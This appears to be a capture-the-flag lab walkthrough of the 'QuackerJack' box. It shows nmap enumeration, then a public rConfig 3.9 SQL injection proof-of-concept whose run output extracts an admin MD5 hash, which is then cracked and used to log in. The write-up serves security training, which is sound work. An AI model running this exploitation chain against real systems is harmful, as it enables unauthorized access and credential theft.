## First Enumerating with nmap

```shell
# Nmap 7.94SVN scan initiated Fri Mar  8 15:34:35 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 21,22,80,111,139,445,3306,8081 -Pn 192.168.185.57
Nmap scan report for 192.168.185.57
Host is up (0.20s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: 400 Bad Request
Service Info: Host: QUACKERJACK; OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-08T14:35:41
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m52s, deviation: 2h53m15s, median: 50s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2024-03-08T09:35:43-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 15:35:30 2024 -- 1 IP address (1 host up) scanned in 54.94 seconds

```


## Enumerating web

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0533edb6-ef6b-422d-ac5f-7c6b52afcf36)

a web server running on port `8081`, opening it on a browser, we got redirected to a login page. And we can see the web app is running `rconfig` service.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cf554c2d-771c-42ce-bb0e-e297665eeafc)

did some research and found out exploits for the `rconfig` service. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/QuakerJack]
└─$ python sqli.py https://192.168.185.57:8081
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.185.57:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
[*Snip*]
Maybe no more information ?
Done
```
ran the sqli exploit, we are able to extract the admin password md5 hash 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/50ffafc2-ba47-4eec-a994-0d9085378ec5)

cracked the password hash `abgrtyu`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6e8dc008-869e-4d1d-9281-fa857cdbad51)

logged in as `admin` success using the password cracked.

